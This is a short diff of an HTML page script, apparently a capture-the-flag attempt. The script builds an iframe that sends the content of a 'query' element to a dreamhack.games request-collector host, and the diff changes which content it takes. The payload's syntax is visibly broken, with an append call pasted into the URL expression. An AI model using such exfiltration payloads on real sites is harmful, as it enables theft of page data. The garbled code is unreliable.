@@ -6,7 +6,7 @@
   </body>
   <script>
     const iframe = document.createElement("iframe")
-    iframe.src = "https://ufhnazq.request.dreamhack.games/" +document.body.append(iframe)document.getElementById("query").contentWindow.document.innerHTML
+    iframe.src = "https://ufhnazq.request.dreamhack.games/" +document.body.append(iframe)document.getElementById("query").contentWindow.document.getElementsByTagName("pre").textContent
     document.body.append(iframe)
   </script>
 </html>
